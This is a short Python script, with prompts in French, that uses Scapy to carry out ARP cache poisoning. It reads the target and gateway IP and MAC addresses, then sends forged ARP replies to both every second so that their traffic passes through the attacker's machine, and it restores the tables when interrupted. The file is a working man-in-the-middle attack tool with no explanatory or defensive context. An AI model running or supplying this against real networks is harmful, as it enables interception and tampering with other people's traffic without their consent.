from scapy.all import ARP, send
import time


Ip_cible = input("Veuillez entrer l'adresse IP de la cible : ")
Mac_cible = input("Veuillez entrer l'adresse MAC de la cible : ")
Ip_passerelle = input("Veuillez entrer l'adresse IP de la passerelle : ")
Mac_passerelle= input("Veuillez entrer l'adresse MAC de la passerelle : ")

def spoof(Ip_dst, Mac_dst,Ip_usurpé):
    packet=ARP(op=2, pdst=Ip_dst, hwdst= Mac_dst, psrc= Ip_usurpé)
    send(packet)
    print(Ip_dst)

def restore(Ip_dst, Ip_src, Mac_src):
    packet=ARP(op=2, pdst= Ip_dst, psrc= Ip_src, hwsrc= Mac_src )
    send(packet, count=4, verbose=False)



try:
    packets = 0

    while packets >= 0:
        spoof(Ip_cible,Mac_cible,Ip_passerelle)
        spoof(Ip_passerelle,Mac_passerelle,Ip_cible)

        time.sleep(1)
        
except KeyboardInterrupt:
    print("\n[+] Restoring ARP tables...")
    restore(Ip_cible, Ip_passerelle, Mac_passerelle)
    restore(Ip_passerelle, Ip_cible, Mac_cible)
    print("[+] ARP tables restored.")

